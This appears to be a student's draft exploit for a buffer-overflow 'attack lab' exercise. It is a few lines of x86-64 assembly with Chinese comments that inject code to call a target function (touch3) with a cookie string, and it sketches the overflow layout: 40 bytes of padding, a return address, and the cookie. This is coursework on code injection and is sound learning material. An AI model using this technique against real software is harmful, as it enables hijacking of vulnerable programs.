sub $0x26,%rsp #dif还要算, 让rsp指向 touch2的位置
lea 8(%rsp),%rdi #给touch3传递参数, rdi存放的 用户输入的 cookie的位置
                #为了不被后面的代码overwrite，必须 放在return address(指向touch3的地址)之后
retq
#这里还需要一行是touch3的地址。
#5个字节的字符串 cookie
#填满40个字节
#返回到第一行命令的地址

